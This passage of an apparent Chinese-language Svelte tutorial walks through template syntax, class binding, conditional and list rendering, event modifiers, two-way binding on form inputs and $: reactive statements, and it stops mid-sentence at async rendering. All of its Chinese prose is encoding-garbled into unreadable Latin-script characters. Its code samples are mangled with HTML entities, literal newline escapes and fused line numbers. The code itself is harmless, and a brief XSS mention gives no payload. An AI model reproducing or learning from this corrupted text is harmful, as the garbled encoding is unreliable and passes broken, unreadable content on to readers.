3 const app = new App({ target: document.getElementById(\u0026#39;app\u0026#39;) }) target æŒ‡æ˜ç›®æ¨™å…ƒç´ ã€‚\næˆ‘å€‘å¤§éƒ¨åˆ†ä»£ç¢¼éƒ½æ˜¯å¯«åœ¨ .svelte å¾Œç¶´çš„æ–‡ä»¶è£¡ã€‚\n.svelte æ–‡ä»¶ä¸»è¦ç¢ºä¿ å¤šå€‹ HTML å…ƒç´ ã€1å€‹ script å…ƒç´  å’Œ 1å€‹ style å…ƒç´ ã€‚é€™3é¡å…ƒç´ éƒ½æ˜¯å¯é¸çš„ã€‚\næˆ‘å€‘ä¸»è¦çš„å·¥ä½œç›®éŒ„æ˜¯ src ç›®éŒ„ã€‚\nç‚ºäº†æ¸›è¼•å­¸ç¿’é›£åº¦ï¼Œæˆ‘å€‘å…ˆåšé€™å¹¾æ­¥æ“ä½œã€‚\næ¸…ç©ºå…¨å±€æ¨£å¼ å¦‚æœä½ ä½¿ç”¨Rollupç‰ˆå‰µå»ºé …ç›®ï¼Œä¸éœ€è¦åšé€™ä¸€æ­¥ã€‚\nåœ¨ä½¿ç”¨ Vite å‰µå»ºçš„ Svelte é …ç›®ä¸­ï¼Œæ‰¾åˆ° src/app.css æ–‡ä»¶ï¼Œä¸¦æŠŠè£¡é¢çš„å…§å®¹æ¸…ç©ºæ‰ã€‚\næ”¹é€  src/App.svelte å°‡ src/App.svelte æ–‡ä»¶æ”¹æˆä»¥ä¸‹å…§å®¹\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let name = \u0026#39;é›·ä¾¯\u0026#39; function handleClick() { name = \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39; } \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;Hello {name}\u0026lt;/div\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt;æ”¹å\u0026lt;/button\u0026gt; æ­¤æ™‚é»æ“ŠæŒ‰éˆ•ï¼Œé é¢ä¸Šçš„\u0026quot;é›·çŒ´\u0026quot; å°±æœƒè®Šæˆ\u0026quot;é¯Šé­šè¾£æ¤’\u0026quot;\nä¸Šé¢çš„ä»£ç¢¼å…¶å¯¦å’Œ Vue æœ‰é»åƒã€‚\nè®Šé‡å’Œæ–¹æ³•éƒ½å¯«åœ¨ \u0026lt;script\u0026gt; æ¨™ç±¤è£¡ã€‚ åœ¨ HTML ä¸­ä½¿ç”¨ {} å¯ä»¥ç¶å®šè®Šé‡å’Œæ–¹æ³•ã€‚ é€šé on:click å¯ä»¥ç¶å®šé»æ“Šäº‹ä»¶ã€‚ åªéœ€å¯«ä»¥ä¸Šä»£ç¢¼ï¼ŒSvelte å°±æœƒè‡ªå‹•å¹«æˆ‘å€‘åšæ•¸æ“šéŸ¿æ‡‰çš„æ“ä½œã€‚ä¸€æ—¦æ•¸æ“šç™¼ç”Ÿæ”¹è®Šï¼Œè¦–åœ–ä¹Ÿæœƒè‡ªå‹•æ”¹è®Šã€‚\næ˜¯ä¸æ˜¯éå¸¸ç°¡å–®ï¼\nåŸºç¤æ¨¡æ¿èªæ³• Svelte çš„æ¨¡æ¿èªæ³•å…¶å¯¦å’Œ Vue æ˜¯æœ‰é»åƒçš„ã€‚å¦‚æœä½ ä¹‹å‰å·²ç¶“ä½¿ç”¨é Vueï¼Œé‚£æœ¬ç¯€å­¸èµ·ä¾†å°±éå¸¸ç°¡å–®ã€‚\næ’å€¼ åœ¨\u0026quot;èµ·æ­¥ç« ç¯€\u0026quot; å·²ç¶“ä½¿ç”¨é æ’å€¼ äº†ã€‚åœ¨ Svelte ä¸­ï¼Œä½¿ç”¨ {} å¤§æ‹¬è™Ÿå°‡ script è£¡çš„æ•¸æ“šç¶å®šåˆ° HTML ä¸­ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; æ­¤æ™‚é é¢ä¸Šå°±æœƒå‡ºç¾ name çš„å€¼ã€‚\né€™ç¨®èªæ³•å’Œ Vue æ˜¯æœ‰é»åƒçš„ï¼ŒVue ä½¿ç”¨é›™å¤§æ‹¬è™Ÿçš„æ–¹å¼ {{}} ç¶å®šæ•¸æ“šã€‚ Svelte å°±å°‘ä¸€å°æ‹¬è™Ÿã€‚\nè¡¨é”å¼ åœ¨ HTML ä¸­é™¤äº†å¯ä»¥ç¶å®šè®Šé‡å¤–ï¼Œé‚„å¯ä»¥ç¶å®šè¡¨é”å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; function sayHi() { return `${name} ä¸–ç•Œï¼` } let a = 1 let b = 2 let state = false \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{sayHi()}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{a} + {b} = {a + b}\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;{state ? \u0026#39;é›·çŒ´\u0026#39; : \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39;}\u0026lt;/div\u0026gt; å±¬æ€§ç¶å®š HTML çš„å±¬æ€§éœ€è¦å‹•æ…‹ç¶å®šæ•¸æ“šæ™‚ï¼Œä¹Ÿæ˜¯ä½¿ç”¨ {} èªæ³•ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let name = \u0026#39;é›·çŒ´\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div title={name}\u0026gt;Hello\u0026lt;/div\u0026gt; ç•¶é¼ æ¨™æ”¾åˆ° div æ¨™ç±¤ä¸Šæ™‚ï¼Œæœƒå‡ºç¾ title è£¡çš„æç¤ºä¿¡æ¯ã€‚\næ¸²æŸ“ HTML æ¨™ç±¤ @html å¦‚æœåªæ˜¯ä½¿ç”¨æ’å€¼çš„æ–¹æ³•æ¸²æŸ“å¸¶æœ‰ HTML æ¨™ç±¤çš„å…§å®¹ï¼ŒSvelte æœƒè‡ªå‹•è½‰ç¾© \u0026lt;ã€\u0026gt; ä¹‹é¡çš„æ¨™ç±¤ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{h1El}\u0026lt;/div\u0026gt; é€™ç¨®æƒ…æ³å¤šæ•¸å‡ºç¾åœ¨æ¸²æŸ“æ–‡æœ¬ã€‚\nåœ¨ Vue ä¸­æœ‰ v-html æ–¹æ³•ï¼Œå®ƒå¯ä»¥å°‡ HTML æ¨™ç±¤æ¸²æŸ“å‡ºä¾†ã€‚åœ¨ Svelte ä¸­ä¹Ÿæœ‰é€™å€‹æ–¹æ³•ï¼Œåœ¨æ’å€¼å‰é¢ä½¿ç”¨ @html æ¨™è¨˜ä¸€ä¸‹å³å¯ã€‚\n1 2 3 4 5 \u0026lt;script\u0026gt; let h1El = \u0026#39;\u0026lt;h1 style=\u0026#34;color: pink;\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/h1\u0026gt;\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt;{@html h1El}\u0026lt;/div\u0026gt; ä½†æ­¤æ–¹æ³•æœ‰å¯èƒ½é­å— XSS æ”»æ“Šã€‚\næˆ‘åœ¨ ã€ŒNodeJS é˜²æ­¢ xss æ”»æ“Šã€ ä¸­ç°¡å–®æ¼”ç¤ºé XSS æ”»æ“Šï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥çœ‹çœ‹ã€‚\næ¨£å¼ç¶å®š åœ¨æ—¥å¸¸é–‹ç™¼ä¸­ï¼Œçµ¦ HTML æ¨™ç±¤è¨­ç½®æ¨£å¼ä¸»è¦é€šé è¡Œå†… style å’Œ class å±¬æ€§ã€‚\nåŸºç¤çš„ HTML å¯«æ³•å’ŒåŸç”Ÿçš„ä¸€æ¨£ï¼Œé€™è£¡ä¸éå¤šè¬›è§£ã€‚\nä¸‹é¢ä¸»è¦è¬›å‹•æ…‹è¨­ç½®æ¨£å¼ï¼Œä¹Ÿå°±æ˜¯å°‡ JS è£¡çš„è®Šé‡æˆ–è€…è¡¨é”å¼ç¶å®šåˆ° style æˆ–è€… class è£¡ã€‚\nè¡Œå…§æ¨£å¼ style 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let color = \u0026#39;red\u0026#39; setTimeout(() =\u0026gt; { color = \u0026#39;blue\u0026#39; }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div style=\u0026#34;color: {color}\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; 1ç§’å¾Œï¼Œæ–‡å­—å¾ç´…è‰²è®Šæˆè—è‰²ã€‚\nç¶å®šclass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let foo = true setTimeout(() =\u0026gt; { foo = false }, 1000) \u0026lt;/script\u0026gt; \u0026lt;div class:active={foo}\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; \u0026lt;style\u0026gt; .active { color: red; } \u0026lt;/style\u0026gt; åœ¨ HTML è£¡å¯ä»¥ä½¿ç”¨ class:xxx å‹•æ…‹è¨­ç½®è¦æ¿€æ´»çš„é¡ã€‚é€™è£¡çš„ xxx æ˜¯å°æ‡‰çš„é¡åã€‚\nèªæ³•æ˜¯ class:xxx={state}ï¼Œç•¶ state ç‚º true æ™‚ï¼Œé€™å€‹æ¨£å¼å°±æœƒè¢«æ¿€æ´»ä½¿ç”¨ã€‚\næ¢ä»¶æ¸²æŸ“ #if ä½¿ç”¨ {#if} é–‹é ­ã€{/if} çµå°¾ã€‚\nåŸºç¤æ¢ä»¶åˆ¤æ–· 1 2 3 {#if æ¡ä»¶åˆ¤æ–­} ... {/if} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; {/if} 1ç§’å¾Œæ”¹è®Šç‹€æ…‹\nå…©ç¨®æ¢ä»¶ 1 2 3 4 5 {#if æ¡ä»¶åˆ¤æ–­} ... {:else} ... {/if} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;script\u0026gt; let state = true setTimeout(() =\u0026gt; { state = false }, 1000) \u0026lt;/script\u0026gt; {#if state} \u0026lt;div\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;é¯Šé­šè¾£æ¤’\u0026lt;/div\u0026gt; {/if} å¤šç¨®æ¢ä»¶ 1 2 3 4 5 {#if æ¢ä»¶åˆ¤æ–·} ... {:else if æ¢ä»¶åˆ¤æ–·} ... {/if} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; let count = 1 setInterval(() =\u0026gt; { count++ }, 1000) \u0026lt;/script\u0026gt; {#if count === 1} \u0026lt;div\u0026gt;é›·çŒ´\u0026lt;/div\u0026gt; {:else if count === 2} \u0026lt;div\u0026gt;é¯Šé­šè¾£æ¤’\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;èŸ‘è‚æƒ¡éœ¸\u0026lt;/div\u0026gt; {/if} æ¢ä»¶æ¸²æŸ“çš„ç”¨æ³•æ¯”è¼ƒç°¡å–®ï¼Œåªè¦ JS åŸºç¤å°±èƒ½çœ‹å¾—æ‡‚ã€‚\nåˆ—è¡¨æ¸²æŸ“ #each å¦‚æœä½ æœ‰ä¸€å †æ•¸æ“šéœ€è¦å±•ç¤ºå‡ºä¾†ï¼Œå¯ä»¥ä½¿ç”¨ #each æ–¹æ³•ã€‚\nä½¿ç”¨ {#each} é–‹é ­ã€{/each} çµå°¾ã€‚\néæ­·æ•¸çµ„ 1 2 3 {#each expression as name} ... {/each} èˆ‰å€‹ä¾‹å­\n1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item} \u0026lt;li\u0026gt;{item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; è¦æ³¨æ„ï¼ŒSvelte å’Œ Vue çš„éæ­·åœ¨å¯«æ³•ä¸Šæœ‰é»ä¸åŒã€‚\nVue çš„æ–¹å¼æ˜¯ï¼š\n1 2 3 \u0026lt;div v-for=\u0026#34;å…ƒç´  in æºæ•¸æ“š\u0026#34;\u0026gt; \u0026lt;span\u0026gt;{{å…ƒç´ }}\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; Svelte çš„æ–¹å¼æ˜¯ï¼š\n1 2 3 4 5 \u0026lt;div\u0026gt; {#each æºæ•¸æ“š as å…ƒç´ } \u0026lt;span\u0026gt;{å…ƒç´ }\u0026lt;/span\u0026gt; {/each} \u0026lt;/div\u0026gt; éæ­·æ•¸çµ„(å¸¶ index) 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; let list = [\u0026#39;a\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as item, index} \u0026lt;li\u0026gt;{index} -- {item}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; æ³¨æ„ï¼šas å¾Œé¢é¦–å…ˆè·Ÿè‘—å…ƒç´ ï¼Œç„¶å¾Œæ‰æ˜¯ä¸‹æ¨™ã€‚è€Œä¸”å…ƒç´ å’Œä¸‹æ¨™ä¸éœ€è¦ç”¨æ‹¬è™Ÿæ‹¬èµ·ä¾†ã€‚\nå¦‚æœå…ƒç´ æ˜¯å°è±¡ï¼Œå¯ä»¥è§£æ§‹ 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let list = [ {name: \u0026#39;é›·çŒ´\u0026#39;}, {name: \u0026#39;é¯Šé­šè¾£æ¤’\u0026#39;} ] \u0026lt;/script\u0026gt; \u0026lt;ul\u0026gt; {#each list as {name}} \u0026lt;li\u0026gt;{name}\u0026lt;/li\u0026gt; {/each} \u0026lt;/ul\u0026gt; é»˜èªå…§å®¹ å¦‚æœæºæ•¸æ“šæ²’æœ‰å…§å®¹ï¼Œæ˜¯ç©ºæ•¸çµ„çš„æƒ…æ³ä¸‹ï¼Œé‚„å¯ä»¥çµ„åˆ {:else} ä¸€èµ·ä½¿ç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let list = [] \u0026lt;/script\u0026gt; \u0026lt;div\u0026gt; {#each list as {name}} \u0026lt;div\u0026gt;{name}\u0026lt;/div\u0026gt; {:else} \u0026lt;div\u0026gt;æš«ç„¡æ•¸æ“š\u0026lt;/div\u0026gt; {/each} \u0026lt;/div\u0026gt; äº‹ä»¶ç¶å®š on:event ä½¿ç”¨ on: æŒ‡ä»¤ç›£è½ DOM äº‹ä»¶ï¼Œon: å¾Œé¢è·Ÿéš¨äº‹ä»¶é¡å‹\nèªæ³•ï¼š\n1 on:äº‹ä»¶é¡å‹={äº‹ä»¶å} èˆ‰å€‹ä¾‹å­ï¼Œé»æ“ŠæŒ‰éˆ•æ™‚åœ¨æ§åˆ¶å°è¼¸å‡º\u0026quot;é›·çŒ´\u0026quot;ã€‚\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;é›·çŒ´\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click={sayHi}\u0026gt;æ‰“æ‹›å‘¼\u0026lt;/button\u0026gt; ç¶å®šå…¶ä»–äº‹ä»¶ï¼ˆæ¯”å¦‚changeç­‰ï¼‰ä¹Ÿæ˜¯åŒæ¨£çš„é“ç†ã€‚\näº‹ä»¶ä¿®é£¾ç¬¦ å¦‚æœä½ åªå¸Œæœ›æŸäº›äº‹ä»¶åªåŸ·è¡Œä¸€æ¬¡ï¼Œæˆ–è€…å–æ¶ˆé»˜èªè¡Œç‚ºï¼Œæˆ–è€…é˜»æ­¢å†’æ³¡ç­‰ï¼Œå¯ä»¥ä½¿ç”¨äº‹ä»¶ä¿®é£¾ç¬¦ã€‚\nèªæ³•ï¼š\n1 on:äº‹ä»¶é¡å‹|ä¿®é£¾ç¬¦={äº‹ä»¶å} èˆ‰å€‹ä¾‹å­ï¼Œæˆ‘å¸Œæœ›é»æ“Šäº‹ä»¶åªèƒ½åŸ·è¡Œä¸€æ¬¡ï¼Œä¹‹å¾Œå†é»æ“Šéƒ½ç„¡æ•ˆï¼Œå¯ä»¥ä½¿ç”¨å®˜æ–¹æä¾›çš„ once ä¿®é£¾ç¬¦ã€‚\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; function sayHi() { console.log(\u0026#39;é›·çŒ´\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;button on:click|once={sayHi}\u0026gt;æ‰“æ‹›å‘¼\u0026lt;/button\u0026gt; å¾ä¸Šåœ–å¯ä»¥çœ‹å‡ºï¼Œå¤šæ¬¡é»æ“Šéƒ½åªæ˜¯è¼¸å‡º1æ¬¡\u0026quot;é›·çŒ´\u0026quot;ã€‚\né™¤äº† once ä¹‹å¤–ï¼Œé‚„æœ‰ä»¥ä¸‹é€™äº›ä¿®é£¾ç¬¦å¯ä»¥ç”¨ï¼š\npreventDefaultï¼šç¦æ­¢é»˜èªäº‹ä»¶ã€‚åœ¨ç¨‹åºé‹è¡Œä¹‹å‰èª¿ç”¨event.preventDefault() stopPropagationï¼šèª¿ç”¨event.stopPropagation(), é˜²æ­¢äº‹ä»¶åˆ°é”ä¸‹ä¸€å€‹æ¨™ç±¤ passiveï¼šæ”¹å–„äº†touch/wheel äº‹ä»¶çš„æ»¾å‹•è¡¨ç¾ï¼ˆSvelteæœƒåœ¨åˆé©çš„åœ°æ–¹è‡ªå‹•åŠ ä¸Šå®ƒï¼‰ captureï¼šè¡¨ç¤ºåœ¨captureéšæ®µè€Œä¸æ˜¯bubblingè§¸ç™¼å…¶ç¨‹åº onceï¼šç¨‹åºé‹è¡Œä¸€æ¬¡å¾Œåˆªé™¤è‡ªèº« ä¸²è¯ä¿®é£¾ç¬¦ ä¿®é£¾ç¬¦é‚„å¯ä»¥ä¸²è¯èµ·ä¾†ä½¿ç”¨ï¼Œæ¯”å¦‚ on:click|once|capture={...}\nä½†éœ€è¦æ³¨æ„ï¼Œæœ‰äº›ç‰¹æ®Šçš„æ¨™ç±¤ä½¿ç”¨ä¿®é£¾ç¬¦æœƒå‡ºç¾\u0026quot;æ„æƒ³ä¸åˆ°\u0026ldquo;çš„çµæœï¼Œæ¯”å¦‚ \u0026lt;a\u0026gt; æ¨™ç±¤ã€‚\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; function toLearn() { console.log(\u0026#39;é‚„åœ¨æ€è€ƒè¦ä¸è¦å­¸Canvas\u0026#39;) } \u0026lt;/script\u0026gt; \u0026lt;a href=\u0026#34;https://juejin.cn/post/7116784455561248775\u0026#34; on:click|once|preventDefault={toLearn} \u0026gt;å»å­¸ç¿’Canvas ï¼Ÿ\u0026lt;/a\u0026gt; æœ¬ä¾†æ˜¯æƒ³çµ¦ \u0026lt;a\u0026gt; æ¨™ç±¤ç¶å®šä¸€å€‹é»æ“Šäº‹ä»¶ï¼Œç¬¬ä¸€æ¬¡é»æ“Šæ™‚åœ¨æ§åˆ¶å°è¼¸å‡ºä¸€å¥è©±ï¼Œä¸¦ä¸”ç¦æ­¢ \u0026lt;a\u0026gt; æ¨™ç±¤çš„é»˜èªäº‹ä»¶ã€‚\næ‰€ä»¥ä½¿ç”¨äº† once å’Œ preventDefault ä¿®é£¾ç¬¦ã€‚\nä½†å¯¦éš›ä¸Šä¸¦éå¦‚æ­¤ã€‚ä¸Šé¢çš„ä»£ç¢¼æ„æ€æ˜¯ once è¨­å®šäº†åªåŸ·è¡Œä¸€æ¬¡ toLearn äº‹ä»¶ï¼Œä¸¦ä¸”åªæœ‰ä¸€æ¬¡ preventDefault æ˜¯æœ‰æ•ˆçš„ã€‚\nåªæœ‰é»æ“Šæ™‚å°±ä¸è§¸ç™¼ toLearn äº†ï¼Œè€Œä¸” preventDefault ä¹Ÿæœƒå¤±æ•ˆã€‚æ‰€ä»¥å†æ¬¡é»æ“Šæ™‚ï¼Œ\u0026lt;a\u0026gt;å…ƒç´ å°±æœƒè§¸ç™¼è‡ªèº«çš„è·³è½‰åŠŸèƒ½ã€‚\næ•¸æ“šç¶å®š bind æ•¸æ“šç¶å®šé€šå¸¸æœƒå’Œè¡¨å–®å…ƒç´ çµåˆä½¿ç”¨ã€‚\nbind å¯ä»¥åšåˆ°é›™å‘æ•¸æ“šç¶å®šçš„æ•ˆæœã€‚æˆ‘è¦ºå¾— Svelte è£¡çš„ bind æœ‰é»åƒ Vue çš„ v-modelã€‚\nèªæ³•ï¼š\n1 bind:property={variable} input å–®è¡Œè¼¸å…¥æ¡† 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; function print() { console.log(msg) } \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; value={msg} /\u0026gt; \u0026lt;button on:click={print}\u0026gt;æ‰“å°\u0026lt;/button\u0026gt; å¦‚æœåªæ˜¯ä½¿ç”¨ value={msg} çš„å¯«æ³•ï¼Œinput é»˜èªå€¼æ˜¯ helloï¼Œç•¶è¼¸å…¥æ¡†çš„å€¼ç™¼ç”Ÿæ”¹è®Šæ™‚ï¼Œä¸¦æ²’æœ‰æŠŠå…§å®¹åæ‡‰å› msg è®Šé‡è£¡ã€‚\næ­¤æ™‚å°±éœ€è¦ä½¿ç”¨ bind äº†ã€‚\n1 2 \u0026lt;!-- çœç•¥éƒ¨åˆ†ä»£ç¢¼ --\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; textarea å¤šè¡Œæ–‡æœ¬æ¡† å¤šè¡Œæ–‡æœ¬æ¡†åŒæ¨£ç¶å®šåœ¨ value å±¬æ€§ä¸Šã€‚\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let msg = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;textarea type=\u0026#34;text\u0026#34; bind:value={msg} /\u0026gt; \u0026lt;p\u0026gt;{msg}\u0026lt;/p\u0026gt; input range ç¯„åœé¸æ“‡ å› ç‚ºéƒ½æ˜¯ input å…ƒç´ ï¼Œåªæ˜¯ type ä¸åŒè€Œå·²ã€‚æ‰€ä»¥ç¯„åœé¸æ“‡å…ƒç´ åŒæ¨£éœ€è¦ç¶å®švalueã€‚\n1 2 3 4 5 6 \u0026lt;script\u0026gt; let val = 3 \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;range\u0026#34; bind:value={val} min=0 max=10 /\u0026gt; \u0026lt;p\u0026gt;{val}\u0026lt;/p\u0026gt; radio å–®é¸ å–®é¸æ¡†é€šå¸¸æ˜¯æˆçµ„å‡ºç¾çš„ï¼Œæ‰€ä»¥è¦ç¶å®šä¸€å€‹ç‰¹æ®Šçš„å€¼ bind:grout={variable}\n1 2 3 4 5 6 7 8 \u0026lt;script\u0026gt; let selected = \u0026#39;2\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; bind:group={selected} value=\u0026#34;3\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{selected}\u0026lt;/p\u0026gt; checkbox è¤‡é¸æ¡† 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; let roles = [] \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;é›·çŒ´\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;é²¨é±¼è¾£æ¤’\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;èŸ‘è‚æ¶éœ¸\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; bind:group={roles} value=\u0026#34;èå­è±è±\u0026#34; /\u0026gt; \u0026lt;p\u0026gt;{roles}\u0026lt;/p\u0026gt; select é¸æ“‡å™¨ 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;script\u0026gt; let selected = \u0026#39;a\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;select bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#39;a\u0026#39;\u0026gt;a\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;b\u0026#39;\u0026gt;b\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#39;c\u0026#39;\u0026gt;c\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; select multiple é¸æ“‡å™¨ 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;script\u0026gt; let selected = [] \u0026lt;/script\u0026gt; \u0026lt;select multiple bind:value={selected}\u0026gt; \u0026lt;option value=\u0026#34;é›·çŒ´\u0026#34;\u0026gt;é›·çŒ´\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;é²¨é±¼è¾£æ¤’\u0026#34;\u0026gt;é²¨é±¼è¾£æ¤’\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;èŸ‘è‚æ¶éœ¸\u0026#34;\u0026gt;èŸ‘è‚æ¶éœ¸\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;èå­è±è±\u0026#34;\u0026gt;èå­è±è±\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;span\u0026gt;{selected}\u0026lt;/span\u0026gt; ç°¡å¯«å½¢å¼ å¦‚æœ bind ç¶å®šçš„å±¬æ€§å’Œåœ¨ JS è£¡è²æ˜çš„è®Šé‡åç›¸åŒï¼Œé‚£å¯ä»¥ç›´æ¥ç¶å®š\n1 2 3 4 5 6 7 \u0026lt;script\u0026gt; let value = \u0026#39;hello\u0026#39; \u0026lt;/script\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; bind:value /\u0026gt; \u0026lt;p\u0026gt;{value}\u0026lt;/p\u0026gt; é€™å€‹ä¾‹å­ä¸­ï¼Œ bind:value ç¶å®šçš„å±¬æ€§æ˜¯ valueï¼Œè€Œåœ¨ JS ä¸­è²æ˜çš„è®Šé‡åä¹Ÿå« valueï¼Œæ­¤æ™‚å°±å¯ä»¥ä½¿ç”¨ç°¡å¯«çš„æ–¹å¼ã€‚\n$: è²æ˜åæ‡‰æ€§ é€šéä½¿ç”¨ $: JS label èªæ³•ä½œç‚ºå‰ç¶´ã€‚å¯ä»¥è®“ä»»ä½•ä½æ–¼top-level çš„èªå¥ï¼ˆå³ä¸åœ¨å¡Šæˆ–å‡½æ•¸å…§éƒ¨ï¼‰å…·æœ‰åæ‡‰æ€§ã€‚æ¯ç•¶å®ƒå€‘ä¾è³´çš„å€¼ç™¼ç”Ÿæ›´æ”¹æ™‚ï¼Œå®ƒå€‘éƒ½æœƒåœ¨ component æ›´æ–°ä¹‹å‰ç«‹å³é‹è¡Œã€‚\nä¸Šé¢é€™æ®µè§£é‡‹æ˜¯å®˜æ–¹æ–‡æª”çš„è§£é‡‹ã€‚\n$:åœ¨æ–‡æª”ä¸­ç¨±ç‚ºReactivityï¼Œä¸­æ–‡æ–‡æª”æˆå®ƒç‚ºåæ‡‰æ€§èƒ½åŠ›ã€‚\nä½†æˆ‘ä½¿ç”¨ $: æ™‚ï¼Œè¦ºå¾—é€™å€‹åŠŸèƒ½æœ‰é»åƒ Vue çš„ computedã€‚\n$: å¯ä»¥ç›£è½è¡¨é”å¼å…§éƒ¨çš„è®ŠåŒ–å¾è€Œåšå‡ºéŸ¿æ‡‰ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script\u0026gt; let count = 0; $: doubled = count * 2; function handleClick() { count += 1; } \u0026lt;/script\u0026gt; \u0026lt;button on:click={handleClick}\u0026gt; é»æ“ŠåŠ 1 \u0026lt;/button\u0026gt; \u0026lt;p\u0026gt;{count} ç¿»å€å¾Œ {doubled}\u0026lt;/p\u0026gt; ä½¿ç”¨ $: è²æ˜çš„ double æœƒè‡ªå‹•æ ¹æ“š count çš„å€¼æ”¹è®Šè€Œæ”¹è®Šã€‚\nå¦‚æœå°‡ä»¥ä¸Šä»£ç¢¼ä¸­ $: æ”¹æˆ let æˆ–è€… var è²æ˜ countï¼Œé‚£éº¼ count å°‡å¤±å»éŸ¿æ‡‰æ€§ã€‚\né€™æ¨£çœ‹ä¾†ï¼ŒçœŸçš„å’Œ Vue çš„ computed çš„ä½œç”¨æœ‰é‚£éº¼ä¸€é»åƒã€‚\nç•°æ­¥æ¸²æŸ“ #await Svelte 